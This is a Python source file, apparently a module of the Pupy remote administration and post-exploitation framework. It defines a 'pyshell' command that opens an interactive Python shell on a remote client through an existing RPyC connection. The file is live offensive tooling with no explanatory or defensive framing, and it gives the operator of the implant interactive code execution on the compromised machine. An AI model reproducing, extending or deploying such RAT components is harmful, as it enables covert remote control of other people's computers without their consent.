# -*- coding: UTF8 -*-
from pupylib.PupyModule import *
import sys
import subprocess
import threading
import Queue
from pupylib.utils.rpyc_utils import interact

import time

__class_name__="InteractivePythonShell"


def enqueue_output(out, queue):
	for c in iter(lambda: out.read(1), b""):
		queue.put(c)

class InteractivePythonShell(PupyModule):
	""" open an interactive python shell on the remote client """
	max_clients=1
	def init_argparse(self):
		self.arg_parser = PupyArgumentParser(prog='pyshell', description=self.__doc__)
	def run(self, args):
		try:
			interact(self.client.conn)
		except KeyboardInterrupt:
			pass




